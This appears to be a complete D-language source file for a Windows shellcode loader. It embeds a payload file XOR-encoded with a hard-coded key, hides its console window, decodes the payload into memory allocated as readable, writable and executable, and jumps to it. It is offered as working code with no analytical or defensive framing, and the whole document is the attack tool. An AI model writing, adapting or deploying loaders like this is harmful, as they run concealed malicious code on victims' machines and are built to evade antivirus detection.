
import core.stdc.string;

immutable ubyte[] KEY = cast(immutable ubyte[]) "Some random string";
immutable obfuscated = (cast(immutable ubyte[]) import("payload")).xor(KEY);

ubyte[] xor(immutable ubyte[] input, immutable ubyte[] key) {
    ubyte[] result;
    result.length = input.length;

    for (size_t i=0 ; i<input.length ; i++)
        result[i] = input[i] ^ key[i % key.length];

    return result;
}

void main() {
    import core.sys.windows.winbase: VirtualAlloc;
    import core.sys.windows.winnt: MEM_COMMIT, PAGE_EXECUTE_READWRITE;
    import core.sys.windows.wincon: GetConsoleWindow;
    import core.sys.windows.winuser: ShowWindow, SW_HIDE;

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    ubyte[] deobfuscated = obfuscated.xor(KEY);
    void* exec = VirtualAlloc(null, deobfuscated.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, deobfuscated.ptr, deobfuscated.length);
    (cast (void function()) exec)();
}
